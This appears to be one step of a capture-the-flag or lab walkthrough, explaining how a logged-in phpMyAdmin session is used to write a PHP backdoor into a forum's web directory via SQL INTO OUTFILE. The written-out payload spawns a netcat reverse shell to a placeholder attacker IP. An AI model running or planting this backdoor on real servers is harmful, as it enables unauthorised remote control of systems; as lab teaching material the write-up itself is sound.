# Writeup 3 - Reverse shell injection

## Writeups Map

![Imgur](https://i.imgur.com/gb4HAhr.png)

## Summary

- [8.1 Injecting a reverse shell](#81-injecting-a-reverse-shell)

## Exploitation

### 8.1 Injecting a reverse shell

> All the following steps can lead here:
>
> - [7. Logging into Phpmyadmin](./Writeup1.md#7-logging-into-phpmyadmin)

We will use a SQL command to create a new file inside the forum pages directory

```SQL
SELECT '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc <ip_addr> 4242 >/tmp/f"); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```

This will inject a backdoor which spawn a reverse shell

This means we have to open netcat on our machine to listen on port 4242 and next execute the backdoor

> From this step you can continue to all the following steps
>
> - [9.2 Getting a FTP access](./Writeup1.md#92-getting-a-ftp-access)
